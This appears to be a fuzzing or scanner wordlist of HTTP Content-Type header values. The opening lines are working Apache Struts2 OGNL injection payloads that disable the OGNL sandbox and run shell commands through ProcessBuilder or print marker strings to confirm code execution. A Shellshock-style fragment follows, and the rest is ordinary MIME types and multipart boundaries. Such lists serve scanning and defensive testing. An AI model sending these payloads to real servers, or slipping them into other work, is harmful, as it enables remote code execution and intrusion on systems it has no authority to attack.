%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('9hk3u44w','1')}.multipart/form-data
%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}
%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}
%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(529844289*29848283)).(#ros.flush())}
?(){:;};``',./"<>?|-[]~@$^*%ff\x00\x00\x00\x00\x00\x0a\xff=
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
application/dns-message
application/grpc-web+proto
application/ipp
application/json
application/json; charset=utf-8
application/json; charset=utf8
application/json;charset=utf-8
application/soap+xml; charset=utf-8
application/soap+xml;charset=UTF-8
application/x-www-form-urlencoded
application/x-www-form-urlencoded; Charset=UTF-8
application/x-www-form-urlencoded; charset=UTF-8
application/x-www-form-urlencoded; charset=UTF-8 
application/x-www-form-urlencoded; charset=utf-8
application/x-www-form-urlencoded;charset=UTF-8
application/xml
gzip, deflate
multipart/form-data; boundary=---------------------------77916619616724262872902741074
multipart/form-data; boundary=---------------------------7e116d19044c
multipart/form-data; boundary=--------------------------835846770881083140190633
multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb
multipart/form-data; boundary=1744fc5d26a2c8793df280174e37f73a
text/html
text/html; charset=UTF-8
text/html; charset=utf-8
text/plain
text/xml
text/xml; Charset=UTF-8
text/xml; charset="utf-8"
text/xml; charset=utf-8
x-application/hessian